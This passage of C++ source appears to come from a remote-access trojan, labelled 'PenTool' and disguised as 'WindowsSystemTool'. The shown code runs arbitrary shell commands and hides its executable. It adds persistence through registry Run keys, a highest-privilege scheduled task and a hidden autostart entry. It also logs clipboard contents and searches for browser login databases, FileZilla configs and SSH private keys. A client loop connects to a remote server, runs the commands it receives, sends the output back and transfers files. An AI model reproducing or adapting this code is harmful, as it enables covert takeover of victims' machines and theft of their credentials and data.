            else if (system("which kdialog > /dev/null 2>&1") == 0) {
                cmd = "kdialog --title \"" + title + "\" --msgbox \"" + message + "\"";
            }
            // Try xmessage (fallback)
            else if (system("which xmessage > /dev/null 2>&1") == 0) {
                cmd = "xmessage -title \"" + title + "\" \"" + message + "\"";
            }
            // No popup tool available
            else {
                std::cout << "No popup tool available. Please install zenity, kdialog, or xmessage.\n";
                return;
            }
            
            int result = system(cmd.c_str());
            if (result == 0) {
                std::cout << "Popup displayed\n";
            } else {
                std::cout << "Failed to display popup\n";
            }
        #endif

        log_action("System popup: " + title + " - " + message);
    }

    // Execute system command
    void execute_system_command(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: sh <command>\n";
            std::cout << "Example: sh ls -la\n";
            std::cout << "Example: sh -e \"echo hello\"\n";
            return;
        }

        std::string cmd;
        bool direct_execute = false;
        
        if (args[0] == "-e") {
            if (args.size() < 2) {
                std::cout << "Usage: sh -e \"command\"\n";
                return;
            }
            cmd = args[1];
            direct_execute = true;
        } else {
            for (size_t i = 0; i < args.size(); i++) {
                if (i > 0) cmd += " ";
                cmd += args[i];
            }
        }

        std::cout << "Executing: " << cmd << "\n";
        
        // Execute the command and capture output
        std::string output = execute_command(cmd);
        
        // Display the output
        if (!output.empty()) {
            std::cout << "Output:\n" << output << "\n";
        } else {
            std::cout << "Command executed (no output)\n";
        }
        
        log_action("Executed system command: " + cmd);
    }

    void execute_zsh_command(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: zsh <command>\n";
            std::cout << "Example: zsh ls -la\n";
            std::cout << "Example: zsh -e \"echo hello\"\n";
            return;
        }

        std::string cmd;
        bool direct_execute = false;
        
        if (args[0] == "-e") {
            if (args.size() < 2) {
                std::cout << "Usage: zsh -e \"command\"\n";
                return;
            }
            cmd = args[1];
            direct_execute = true;
        } else {
            for (size_t i = 0; i < args.size(); i++) {
                if (i > 0) cmd += " ";
                cmd += args[i];
            }
        }

        std::cout << "Executing: " << cmd << "\n";
        
        // Escape the command for safe zsh execution
        std::string escaped_cmd;
        for (char c : cmd) {
            if (c == '"') {
                escaped_cmd += "\\\"";
            } else if (c == '\\') {
                escaped_cmd += "\\\\";
            } else {
                escaped_cmd += c;
            }
        }
        
        // Execute the command using zsh
        std::string full_cmd = "zsh -c \"" + escaped_cmd + "\"";
        std::string output = execute_command(full_cmd);
        
        // Display the output
        if (!output.empty()) {
            std::cout << "Output:\n" << output << "\n";
        } else {
            std::cout << "Command executed (no output)\n";
        }
        
        log_action("Executed zsh command: " + cmd);
    }

    void detect_hardware(const std::vector<std::string>& args) {
        std::cout << "Detecting system hardware and connected devices...\n\n";
        
        std::string output;
        
        #ifdef _WIN32
            // Windows hardware detection
            std::cout << "=== Windows System Information ===\n";
            
            // Get basic system info
            std::string sysinfo = execute_command("systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Manufacturer\" /C:\"System Model\" /C:\"Processor(s)\" /C:\"Total Physical Memory\"");
            output += sysinfo;
            
            // Get disk information
            std::cout << "\n=== Disk Drives ===\n";
            std::string diskinfo = execute_command("wmic diskdrive get model,size,status");
            output += diskinfo;
            
            // Get USB devices
            std::cout << "\n=== USB Devices ===\n";
            std::string usbinfo = execute_command("wmic path win32_usbcontrollerdevice get dependent");
            output += usbinfo;
            
            // Get graphics cards
            std::cout << "\n=== Graphics Cards ===\n";
            std::string gpuinfo = execute_command("wmic path win32_VideoController get name");
            output += gpuinfo;
            
            // Get network adapters
            std::cout << "\n=== Network Adapters ===\n";
            std::string netinfo = execute_command("wmic nic get name, netconnectionid, netenabled");
            output += netinfo;
            
        #else
            // Linux hardware detection using zsh
            std::cout << "=== Linux System Information ===\n";
            
            // Get CPU info
            std::cout << "\n=== CPU Information ===\n";
            std::string cpuinfo = execute_command("zsh -c \"cat /proc/cpuinfo | grep 'model name' | uniq\"");
            output += cpuinfo;
            
            // Get memory info
            std::cout << "\n=== Memory Information ===\n";
            std::string meminfo = execute_command("zsh -c \"free -h\"");
            output += meminfo;
            
            // Get disk information
            std::cout << "\n=== Disk Drives ===\n";
            std::string diskinfo = execute_command("zsh -c \"lsblk -o NAME,MODEL,SIZE,TYPE,MOUNTPOINT\"");
            output += diskinfo;
            
            // Get USB devices
            std::cout << "\n=== USB Devices ===\n";
            std::string usbinfo = execute_command("zsh -c \"lsusb\"");
            output += usbinfo;
            
            // Get graphics cards
            std::cout << "\n=== Graphics Cards ===\n";
            std::string gpuinfo = execute_command("zsh -c \"lspci | grep VGA\"");
            output += gpuinfo;
            
            // Get network adapters
            std::cout << "\n=== Network Adapters ===\n";
            std::string netinfo = execute_command("zsh -c \"lspci | grep Network\"");
            output += netinfo;
            
            // Get connected peripherals
            std::cout << "\n=== Connected Peripherals ===\n";
            std::string periphinfo = execute_command("zsh -c \"lsinput\"");
            output += periphinfo;
        #endif
        
        // Display the collected information
        std::cout << "\n=== Hardware Detection Results ===\n";
        std::cout << output << "\n";
        
        // Log the action
        log_action("Hardware detection performed");
    }

    // Handle script command
    void handle_script(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: script <script_file>\n";
            return;
        }

        std::string script_file = args[0];
        
        // Check if the script file exists
        if (!fs::exists(script_file)) {
            std::cout << "Error: Script file not found: " << script_file << "\n";
            return;
        }

        std::cout << "Executing script: " << script_file << "\n";

        // Read and execute the script line by line
        std::ifstream file(script_file);
        if (!file.is_open()) {
            std::cout << "Error: Could not open script file\n";
            return;
        }

        std::string line;
        while (std::getline(file, line)) {
            // Skip empty lines and comments
            if (line.empty() || line[0] == '#') {
                continue;
            }

            std::cout << "> " << line << "\n";

            // Parse the command and arguments
            std::vector<std::string> cmd_args;
            std::istringstream iss(line);
            std::string token;
            
            while (iss >> token) {
                cmd_args.push_back(token);
            }

            if (!cmd_args.empty()) {
                // Find and execute the command
                bool found = false;
                std::vector<std::string> args;
                if (cmd_args.size() > 1) {
                    args.assign(cmd_args.begin() + 1, cmd_args.end());
                }
                
                for (const auto& cmd : commands) {
                    if (cmd.name == cmd_args[0]) {
                        cmd.func(args);
                        found = true;
                        break;
                    }
                }
                
                if (!found) {
                    std::cout << "Unknown command: " << cmd_args[0] << "\n";
                }
            }
        }

        std::cout << "Script execution completed\n";
        log_action("Executed script: " + script_file);
    }

    // Handle ssl command
    void handle_ssl(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: ssl <hostname> [port]\n";
            return;
        }

        std::string hostname = args[0];
        int port = 443;
        if (args.size() > 1) {
            try {
                port = std::stoi(args[1]);
            } catch (...) {
                port = 443;
            }
        }

        std::cout << "\n[SSL/TLS Certificate Check]\n";
        std::cout << "Checking certificate for: " << hostname << ":" << port << "\n";

        #ifdef _WIN32
            // Windows implementation using PowerShell
            std::string cmd = "powershell -Command \"$tcpClient = New-Object System.Net.Sockets.TcpClient('" + hostname + "', " + std::to_string(port) + "); "
                             "$sslStream = New-Object System.Net.Security.SslStream($tcpClient.GetStream()); "
                             "$sslStream.AuthenticateAsClient('" + hostname + "'); "
                             "$cert = $sslStream.RemoteCertificate; "
                             "$cert2 = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($cert); "
                             "Write-Host 'Subject: ' $cert2.Subject; "
                             "Write-Host 'Issuer: ' $cert2.Issuer; "
                             "Write-Host 'Valid From: ' $cert2.NotBefore; "
                             "Write-Host 'Valid To: ' $cert2.NotAfter; "
                             "Write-Host 'Thumbprint: ' $cert2.Thumbprint; "
                             "$sslStream.Close(); $tcpClient.Close();\"";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #else
            // Linux implementation using OpenSSL
            std::string cmd = "echo | openssl s_client -connect " + hostname + ":" + std::to_string(port) + " 2>/dev/null | openssl x509 -noout -dates -issuer -subject";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #endif

        log_action("SSL certificate check for: " + hostname);
    }

    // Handle crawl command
    void handle_crawl(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: crawl <url> [depth]\n";
            return;
        }

        std::string url = args[0];
        int depth = 1;
        if (args.size() > 1) {
            try {
                depth = std::stoi(args[1]);
            } catch (...) {
                depth = 1;
            }
        }

        std::cout << "\n[Website Crawler]\n";
        std::cout << "Crawling: " << url << " (depth: " << depth << ")\n";

        #ifdef _WIN32
            // Windows implementation using PowerShell
            std::string cmd = "powershell -Command \"$web = Invoke-WebRequest -Uri '" + url + "'; "
                             "$links = $web.Links.Href | Where-Object { $_ -like 'http*' } | Select-Object -Unique; "
                             "Write-Host 'Found ' ($links.Count) ' links:'; "
                             "foreach ($link in $links) { Write-Host $link }\"";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #else
            // Linux implementation using curl and grep
            std::string cmd = "curl -s " + url + " | grep -o 'href=\"[^\"]*\"' | cut -d'\"' -f2 | grep '^http'";
            std::string output = execute_command(cmd);
            std::cout << output << "\n";
        #endif

        log_action("Website crawl for: " + url);
    }

    // Handle procmon command
    void handle_procmon(const std::vector<std::string>& args) {
        std::cout << "\n[Process Monitor]\n";
        std::cout << "Starting detailed process monitoring...\n";
        std::cout << "Press Ctrl+C to stop monitoring\n\n";

        // Create a separate thread for monitoring
        std::thread monitor_thread([this]() {
            auto prev_processes = get_processes();
            
            while (true) {
                auto curr_processes = get_processes();
                
                // Check for new processes
                for (const auto& curr_proc : curr_processes) {
                    bool found = false;
                    for (const auto& prev_proc : prev_processes) {
                        if (curr_proc.pid == prev_proc.pid) {
                            found = true;
                            break;
                        }
                    }
                    
                    if (!found) {
                        std::cout << "[NEW] PID: " << std::left << std::setw(6) << curr_proc.pid 
                                  << " | Name: " << std::setw(20) << curr_proc.name 
                                  << " | User: " << curr_proc.user << "\n";
                    }
                }
                
                // Check for terminated processes
                for (const auto& prev_proc : prev_processes) {
                    bool found = false;
                    for (const auto& curr_proc : curr_processes) {
                        if (curr_proc.pid == prev_proc.pid) {
                            found = true;
                            break;
                        }
                    }
                    
                    if (!found) {
                        std::cout << "[TERM] PID: " << std::left << std::setw(6) << prev_proc.pid 
                                  << " | Name: " << std::setw(20) << prev_proc.name 
                                  << " | User: " << prev_proc.user << "\n";
                    }
                }
                
                // Update previous state
                prev_processes = curr_processes;
                
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        });
        
        // Detach the thread so it runs independently
        monitor_thread.detach();
        
        log_action("Started process monitoring");
    }

    // Handle task command
    void handle_task(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: task <list|create|delete> [args]\n";
            return;
        }

        std::string action = args[0];

        if (action == "list") {
            std::cout << "\n[Scheduled Tasks]\n";
            
            #ifdef _WIN32
                std::string output = execute_command("schtasks /query /fo LIST");
                std::cout << output << "\n";
            #else
                std::string output = execute_command("crontab -l");
                std::cout << output << "\n";
            #endif
        } 
        else if (action == "create") {
            if (args.size() < 3) {
                std::cout << "Usage: task create <name> <command>\n";
                return;
            }
            
            std::string name = args[1];
            std::string command;
            for (size_t i = 2; i < args.size(); i++) {
                if (i > 2) command += " ";
                command += args[i];
            }
            
            #ifdef _WIN32
                std::string cmd = "schtasks /create /tn \"" + name + "\" /tr \"" + command + "\" /sc daily /st 00:00";
                int result = system(cmd.c_str());
                if (result == 0) {
                    std::cout << "Task created successfully\n";
                } else {
                    std::cout << "Failed to create task\n";
                }
            #else
                std::string cmd = "(crontab -l 2>/dev/null; echo \"0 0 * * * " + command + "\") | crontab -";
                int result = system(cmd.c_str());
                if (result == 0) {
                    std::cout << "Task created successfully\n";
                } else {
                    std::cout << "Failed to create task\n";
                }
            #endif
        }
        else if (action == "delete") {
            if (args.size() < 2) {
                std::cout << "Usage: task delete <name>\n";
                return;
            }
            
            std::string name = args[1];
            
            #ifdef _WIN32
                std::string cmd = "schtasks /delete /tn \"" + name + "\" /f";
                int result = system(cmd.c_str());
                if (result == 0) {
                    std::cout << "Task deleted successfully\n";
                } else {
                    std::cout << "Failed to delete task\n";
                }
            #else
                std::cout << "Task deletion not implemented for Linux\n";
            #endif
        }
        else {
            std::cout << "Unknown task action: " << action << "\n";
        }
        
        log_action("Task management: " + action);
    }

    // Handle driver command
    void handle_driver(const std::vector<std::string>& args) {
        std::cout << "\n[Loaded Drivers]\n";
        
        #ifdef _WIN32
            std::string output = execute_command("driverquery");
            std::cout << output << "\n";
        #else
            std::string output = execute_command("lsmod");
            std::cout << output << "\n";
        #endif
        
        log_action("Listed loaded drivers");
    }

    // Handle hide command
    void handle_hide(const std::vector<std::string>& args) {
        std::cout << "\n[Process Hiding]\n";
        
        // Get the current executable path
        char exe_path[MAX_PATH_LENGTH];
        #ifdef _WIN32
            GetModuleFileName(NULL, exe_path, MAX_PATH_LENGTH);
        #else
            ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
            if (len == -1) {
                std::cout << "Failed to get executable path\n";
                return;
            }
            exe_path[len] = '\0';
        #endif
        
        std::string exe_name = fs::path(exe_path).filename().string();
        
        // Add to startup
        #ifdef _WIN32
            // Registry startup
            HKEY hKey;
            if (RegOpenKeyEx(HKEY_CURRENT_USER, 
                            "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
                RegSetValueEx(hKey, "WindowsSystemTool", 0, REG_SZ, (BYTE*)exe_path, strlen(exe_path));
                RegCloseKey(hKey);
                std::cout << "Added to registry startup\n";
            }
            
            // Task scheduler startup
            std::string cmd = "schtasks /create /tn \"WindowsSystemTool\" /tr \"" + std::string(exe_path) + "\" /sc onlogon /rl HIGHEST /f";
            system(cmd.c_str());
            std::cout << "Added to task scheduler\n";
            
            // Hide file attributes
            cmd = "attrib +h +s \"" + std::string(exe_path) + "\"";
            system(cmd.c_str());
            std::cout << "Set hidden and system attributes\n";
        #else
            // Linux startup
            std::string startup_dir = std::string(getenv("HOME")) + "/.config/autostart/";
            fs::create_directories(startup_dir);
            
            std::string desktop_file = startup_dir + "windows-system-tool.desktop";
            std::ofstream file(desktop_file);
            if (file.is_open()) {
                file << "[Desktop Entry]\n";
                file << "Type=Application\n";
                file << "Name=Windows System Tool\n";
                file << "Exec=" << exe_path << "\n";
                file << "Hidden=true\n";
                file.close();
                std::cout << "Added to autostart\n";
            }
            
            // Hide file
            std::string hidden_path = std::string(getenv("HOME")) + "/.system-tool";
            fs::copy_file(exe_path, hidden_path, fs::copy_options::overwrite_existing);
            std::string cmd = "chmod +x " + hidden_path;
            system(cmd.c_str());
            std::cout << "Created hidden copy at: " << hidden_path << "\n";
        #endif
        
        log_action("Enabled process hiding and persistence");
    }

    // Handle clipboard command
    void handle_clipboard(const std::vector<std::string>& args) {
        std::cout << "\n[Clipboard Monitor]\n";
        std::cout << "Monitoring clipboard contents...\n";
        std::cout << "Press Ctrl+C to stop monitoring\n\n";

        // Create a separate thread for monitoring
        std::thread monitor_thread([this]() {
            std::string last_content = "";
            
            while (true) {
                std::string current_content = "";
                
                #ifdef _WIN32
                    // Windows clipboard
                    if (OpenClipboard(NULL)) {
                        HANDLE hData = GetClipboardData(CF_TEXT);
                        if (hData != NULL) {
                            char* pszText = static_cast<char*>(GlobalLock(hData));
                            if (pszText != NULL) {
                                current_content = pszText;
                                GlobalUnlock(hData);
                            }
                        }
                        CloseClipboard();
                    }
                #else
                    // Linux clipboard using xclip
                    FILE* pipe = popen("xclip -o -selection clipboard 2>/dev/null", "r");
                    if (pipe) {
                        char buffer[128];
                        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                            current_content += buffer;
                        }
                        pclose(pipe);
                    }
                #endif
                
                if (current_content != last_content && !current_content.empty()) {
                    std::cout << "[CLIPBOARD] " << current_content << "\n";
                    
                    // Log to file
                    std::ofstream logFile("clipboard_log.txt", std::ios::app);
                    if (logFile.is_open()) {
                        auto now = std::chrono::system_clock::now();
                        std::time_t time = std::chrono::system_clock::to_time_t(now);
                        std::string time_str = std::ctime(&time);
                        time_str.pop_back(); // Remove newline
                        
                        logFile << "[" << time_str << "] " << current_content << "\n";
                        logFile.close();
                    }
                    
                    last_content = current_content;
                }
                
                std::this_thread::sleep_for(std::chrono::seconds(1));
            }
        });
        
        // Detach the thread so it runs independently
        monitor_thread.detach();
        
        log_action("Started clipboard monitoring");
    }

    // Add this to your class definition (private section)
    #ifdef _WIN32
        SOCKET client_socket;
    #else
        int client_socket;
    #endif

    // Updated handle_upload function
    void handle_upload(const std::vector<std::string>& args) {
        if (args.empty()) {
            std::cout << "Usage: upload <file_path> [-hide|-i|-e]\n";
            return;
        }

        // Check for expose command
        if (args[0] == "-e") {
            if (args.size() < 2) {
                std::cout << "Usage: upload -e <file_path|all>\n";
                return;
            }
            
            if (args[1] == "all") {
                std::string msg = "[EXPOSE_ALL]\n";
                send_to_server(msg);
                std::cout << "Request to expose all hidden files sent to server.\n";
                log_action("Request to expose all hidden files sent");
            } else {
                std::string msg = "[EXPOSE_FILE:" + args[1] + "]\n";
                send_to_server(msg);
                std::cout << "Request to expose file sent to server: " << args[1] << "\n";
                log_action("Request to expose file sent: " + args[1]);
            }
            return;
        }

        std::string file_path = args[0];
        bool hide_flag = false;
        bool invisible_flag = false;
        
        for (size_t i = 1; i < args.size(); i++) {
            if (args[i] == "-hide") {
                hide_flag = true;
            } else if (args[i] == "-i") {
                invisible_flag = true;
            }
        }

        // Check if file exists
        std::ifstream file(file_path, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            std::cout << "Error: File not found: " << file_path << "\n";
            return;
        }

        // Get file size
        size_t file_size = file.tellg();
        file.seekg(0, std::ios::beg);
        
        // Extract filename from path
        fs::path p(file_path);
        std::string filename = p.filename().string();

        // Create header with file info
        std::string header = "[UPLOAD_FILE:" + filename + ":" + std::to_string(file_size) + ":" + 
                             (hide_flag ? "1" : "0") + ":" + (invisible_flag ? "1" : "0") + "]";
        
        // Send header
        if (!send_all(this->client_socket, header.c_str(), header.size())) {
            std::cerr << "Failed to send upload header\n";
            return;
        }
        
        // Send file content
        char buffer[4096];
        size_t bytes_sent = 0;
        
        while (bytes_sent < file_size) {
            file.read(buffer, std::min(sizeof(buffer), file_size - bytes_sent));
            size_t bytes_read = file.gcount();
            
            if (!send_all(this->client_socket, buffer, bytes_read)) {
                std::cerr << "Failed to send file data\n";
                return;
            }
            bytes_sent += bytes_read;
        }
        
        file.close();
        
        std::cout << "File uploaded successfully: " << file_path << " (" << bytes_sent << " bytes)\n";
        log_action("File uploaded: " + file_path);
        
        // If hide or invisible flags are set, notify server
        if (hide_flag || invisible_flag) {
            std::string flag_msg = "[FILE_FLAGS:" + filename + ":" + 
                                  (hide_flag ? "H" : "") + (invisible_flag ? "I" : "") + "]\n";
            send_to_server(flag_msg);
            std::cout << "File marked as " << (hide_flag ? "hidden " : "") 
                      << (invisible_flag ? "invisible" : "") << " on server.\n";
        }
    }

    // Handle tokens command
    void handle_tokens(const std::vector<std::string>& args) {
        std::cout << "\n[Available Tokens]\n";
        
        #ifdef _WIN32
            // Windows tokens using PowerShell
            std::string output = execute_command("powershell -Command \"Get-ChildItem -Path 'Registry::HKEY_USERS' -Name | Where-Object { $_ -match 'S-1-5-21-.*' } | ForEach-Object { Write-Host 'User SID: ' $_ }\"");
            std::cout << output << "\n";
            
            output = execute_command("powershell -Command \"whoami /all\"");
            std::cout << output << "\n";
        #else
            std::cout << "Token listing not implemented for Linux\n";
        #endif
        
        log_action("Listed available tokens");
    }

    // Handle passwords command
    void handle_passwords(const std::vector<std::string>& args) {
        std::cout << "\n[Password Search]\n";
        
        // Common password file locations
        std::vector<std::string> search_paths = {
            #ifdef _WIN32
                std::string(getenv("USERPROFILE")) + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                std::string(getenv("USERPROFILE")) + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",
                std::string(getenv("APPDATA")) + "\\FileZilla\\sitemanager.xml",
                std::string(getenv("APPDATA")) + "\\FileZilla\\recentservers.xml",
            #else
                std::string(getenv("HOME")) + "/.config/google-chrome/Default/Login Data",
                std::string(getenv("HOME")) + "/.mozilla/firefox/*.default*",
                std::string(getenv("HOME")) + "/.config/filezilla/sitemanager.xml",
                std::string(getenv("HOME")) + "/.config/filezilla/recentservers.xml",
                std::string(getenv("HOME")) + "/.ssh/id_rsa",
                std::string(getenv("HOME")) + "/.ssh/id_dsa",
            #endif
        };

        for (const auto& path : search_paths) {
            if (fs::exists(path)) {
                std::cout << "Found potential password file: " << path << "\n";
            }
        }
        
        // Search for password-related files
        std::vector<std::string> password_keywords = {
            "password", "passwd", "pwd", "credential", "login", "auth", "secret", "key"
        };
        
        std::cout << "\nSearching for files with password-related names...\n";
        
        for (const auto& keyword : password_keywords) {
            std::string cmd;
            
            #ifdef _WIN32
                cmd = "dir /s /b " + std::string(getenv("USERPROFILE")) + "\\*password*";
            #else
                cmd = "find " + std::string(getenv("HOME")) + " -name '*" + keyword + "*' 2>/dev/null";
            #endif
            
            std::string output = execute_command(cmd);
            if (!output.empty()) {
                std::cout << "Files containing '" << keyword << "':\n" << output << "\n";
            }
        }
        
        log_action("Searched for password files");
    }

    // Modified log_action to also queue logs for remote transmission
    void log_output(const std::string& action) {
        std::cout << "[LOG] " << action << std::endl;
        {
            std::lock_guard<std::mutex> lock(log_queue_mutex);
            log_queue.push(action);
        }
    }

    // Handle remote command - now uses predefined server URL
    void handle_remote(const std::vector<std::string>& args) {
        // Parse the remote_server_url to extract IP and port
        std::string server_ip = remote_server_url;
        int server_port = remote_server_port;
        
        size_t colon_pos = remote_server_url.find(':');
        if (colon_pos != std::string::npos) {
            server_ip = remote_server_url.substr(0, colon_pos);
            try {
                server_port = std::stoi(remote_server_url.substr(colon_pos + 1));
            } catch (...) {
                // Use default port if parsing fails
                server_port = remote_server_port;
            }
        }
        
        std::cout << "Connecting to remote server: " << server_ip << ":" << server_port << "\n";

        // Start the remote client in a separate thread
        remote_client_running = true;
        remote_client_thread = std::thread([this, server_ip, server_port]() {
            remote_client_loop(server_ip, server_port);
        });
        remote_client_thread.detach();

        log_action("Connected to remote server: " + server_ip);
    }

    // Fixed remote_client_loop function
    void remote_client_loop(const std::string& server_ip, int server_port) {
        #ifdef _WIN32
            WSADATA wsaData;
            if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
                std::cerr << "[ERROR] WSAStartup failed\n";
                remote_client_running = false;
                return;
            }
        #endif

        while (remote_client_running) {
            try {
                socket_t sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) {
                    std::cerr << "[ERROR] Socket creation failed\n";
                    break;
                }

                sockaddr_in server_addr{};
                server_addr.sin_family = AF_INET;
                server_addr.sin_port = htons(server_port);
                
                #ifdef _WIN32
                    server_addr.sin_addr.s_addr = inet_addr(server_ip.c_str());
                #else
                    inet_pton(AF_INET, server_ip.c_str(), &server_addr.sin_addr);
                #endif

                if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
                    std::cerr << "[ERROR] Connection failed to " << server_ip << ":" << server_port << "\n";
                    #ifdef _WIN32
                        closesocket(sock);
                    #else
                        close(sock);
                    #endif
                    std::this_thread::sleep_for(std::chrono::seconds(5));
                    continue;
                }

                std::cout << "[SUCCESS] Connected to " << server_ip << ":" << server_port << "\n";
                current_socket = sock; // Set current socket for this thread

                // Send initial message
                send_to_server("PenTool client connected");
                
                // Send initial directory
                send_current_directory(sock);

                // Set socket to non-blocking mode
                #ifdef _WIN32
                    u_long mode = 1;
                    ioctlsocket(sock, FIONBIO, &mode);
                #else
                    fcntl(sock, F_SETFL, O_NONBLOCK);
                #endif

                // Main loop for handling commands and sending logs
                while (remote_client_running) {
                    try {
                        // Send any pending logs
                        {
                            std::lock_guard<std::mutex> lock(log_queue_mutex);
                            while (!log_queue.empty()) {
                                std::string log = log_queue.front();
                                log_queue.pop();
                                
                                std::string msg = "[LOG] " + log + "\n";
                                send_to_server(msg);
                            }
                        }

                        // Check for incoming commands
                        char buffer[4096];
                        memset(buffer, 0, sizeof(buffer));
                        int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
                        
                        if (bytes_received > 0) {
                            // Check if this is a binary file transfer
                            if (memcmp(buffer, "[UPLOAD_FILE:", 13) == 0) {
                                // Handle binary file upload
                                std::cout << "[REMOTE] Received file upload command\n";

                                // Find the end of the header
                                std::string header_str;
                                size_t i = 0;
                                while (i < bytes_received && buffer[i] != ']') {
                                    header_str += buffer[i];
                                    i++;
                                }
                                if (i < bytes_received) {
                                    header_str += ']'; // Include the closing bracket
                                    i++; // Move past the bracket
                                }

                                // Parse the header
                                size_t end_pos = header_str.find(']');
                                if (end_pos != std::string::npos) {
                                    std::string params = header_str.substr(13, end_pos - 13);
                                    std::vector<std::string> parts;
                                    std::istringstream iss(params);
                                    std::string part;
                                    
                                    while (std::getline(iss, part, ':')) {
                                        parts.push_back(part);
                                    }
                                    
                                    if (parts.size() >= 4) {
                                        std::string filename = parts[0];
                                        size_t file_size = std::stoul(parts[1]);
                                        bool hide_flag = (parts[2] == "1");
                                        
                                        // Create file
                                        std::ofstream file(filename, std::ios::binary);
                                        if (file) {
                                            // Write any data that came with the header
                                            if (i < bytes_received) {
                                                file.write(buffer + i, bytes_received - i);
                                            }
                                            
                                            // Receive the rest of the file
                                            size_t total_received = bytes_received - i;
                                            while (total_received < file_size) {
                                                memset(buffer, 0, sizeof(buffer));
                                                size_t to_receive = std::min(sizeof(buffer), file_size - total_received);
                                                int bytes = recv(sock, buffer, to_receive, 0);
                                                if (bytes > 0) {
                                                    file.write(buffer, bytes);
                                                    total_received += bytes;
                                                } else {
                                                    break;
                                                }
                                            }
                                            
                                            file.close();
                                            
                                            // Apply hide flag if needed
                                            if (hide_flag) {
                                                #ifdef _WIN32
                                                    SetFileAttributesA(filename.c_str(), FILE_ATTRIBUTE_HIDDEN);
                                                #else
                                                    std::string hidden_name = "." + filename;
                                                    std::rename(filename.c_str(), hidden_name.c_str());
                                                #endif
                                            }
                                            
                                            std::cout << "File received: " << filename << (hide_flag ? " (hidden)" : "") << "\n";
                                            log_action("File received from server: " + filename);
                                        } else {
                                            std::cout << "Error saving file: " << filename << "\n";
                                        }
                                    }
                                }
                            } else if (memcmp(buffer, "[PULL_RESPONSE:", 15) == 0) {
                                // Format: [PULL_RESPONSE:yes/no]
                                std::string command(buffer, bytes_received);
                                size_t end_pos = command.find(']');
                                if (end_pos != std::string::npos) {
                                    std::string response = command.substr(15, end_pos - 15);
                                    std::cout << "Server response: " << response << "\n";
                                    if (response == "yes") {
                                        // Continue with the pull operation
                                        // This is a simplified approach - in a real implementation, 
                                        // you would need to track which pull operation this response is for
                                    }
                                }
                            } else {
                                // Handle text commands
                                std::string command(buffer, bytes_received);
                                std::cout << "[REMOTE] Received command: " << command << "\n";

                                // Execute the command and capture output
                                std::string output;
                                {
                                    std::lock_guard<std::mutex> lock(remote_mutex);
                                    
                                    // Redirect cout to capture output
                                    std::streambuf* orig = std::cout.rdbuf();
                                    std::ostringstream capture;
                                    std::cout.rdbuf(capture.rdbuf());

                                    // Parse and execute the command
                                    std::vector<std::string> cmd_args;
                                    std::istringstream iss(command);
                                    std::string token;
                                    
                                    while (iss >> token) {
                                        cmd_args.push_back(token);
                                    }

                                    if (!cmd_args.empty()) {
                                        // Find and execute the command
                                        bool found = false;
                                        std::vector<std::string> args;
                                        if (cmd_args.size() > 1) {
                                            args.assign(cmd_args.begin() + 1, cmd_args.end());
                                        }
                                        
                                        // Store current directory before command
                                        std::string old_dir = current_dir;
                                        
                                        for (const auto& cmd : commands) {
                                            if (cmd.name == cmd_args[0]) {
                                                cmd.func(args);
                                                found = true;
                                                break;
                                            }
                                        }
                                        
                                        if (!found) {
                                            std::cout << "Unknown command: " << cmd_args[0] << "\n";
                                        }
                                        
                                        // Check if directory changed (especially for cd command)
                                        if (cmd_args[0] == "cd" && old_dir != current_dir) {
                                            send_current_directory(sock);
                                        }
                                    }

                                    // Restore cout
                                    std::cout.rdbuf(orig);
                                    output = capture.str();
                                }

                                // Send output back to server
                                if (!output.empty()) {
                                    std::string msg = "[OUTPUT] " + output + "\n";
                                    send_to_server(msg);
                                }
                            }
                        } else if (bytes_received == 0) {
                            // Connection closed by server
                            std::cerr << "[ERROR] Connection closed by server\n";
                            break;
                        } else {
                            // No data received or error
                            #ifdef _WIN32
                                int error = WSAGetLastError();
                                if (error != WSAEWOULDBLOCK) {
                                    std::cerr << "[ERROR] Connection lost: " << error << "\n";
                                    break;
                                }
                            #else
                                if (errno != EWOULDBLOCK && errno != EAGAIN) {
                                    std::cerr << "[ERROR] Connection lost: " << strerror(errno) << "\n";
                                    break;
                                }
                            #endif
                        }

                        // Small delay to prevent high CPU usage
                        std::this_thread::sleep_for(std::chrono::milliseconds(100));
                    } catch (const std::exception& e) {
                        std::cerr << "[ERROR] Exception in command loop: " << e.what() << std::endl;
                        // Continue the loop despite the exception
                    } catch (...) {
                        std::cerr << "[ERROR] Unknown exception in command loop" << std::endl;
                        // Continue the loop despite the exception
                    }
                }

                #ifdef _WIN32
                    closesocket(sock);
                #else
                    close(sock);
                #endif

                current_socket = -1; // Reset current socket
                std::this_thread::sleep_for(std::chrono::seconds(1));
            } catch (const std::exception& e) {
                std::cerr << "[ERROR] Exception in connection loop: " << e.what() << std::endl;
                // Continue the loop despite the exception
            } catch (...) {
                std::cerr << "[ERROR] Unknown exception in connection loop" << std::endl;
                // Continue the loop despite the exception
            }
        }

        #ifdef _WIN32
            WSACleanup();
        #endif

        remote_client_running = false;
    }

    // Get comprehensive network information
    NetworkInfo getNetworkInfo() {
        NetworkInfo info = {"Unknown", "Unknown", "Unknown", "Unknown"};
        
    #ifdef _WIN32
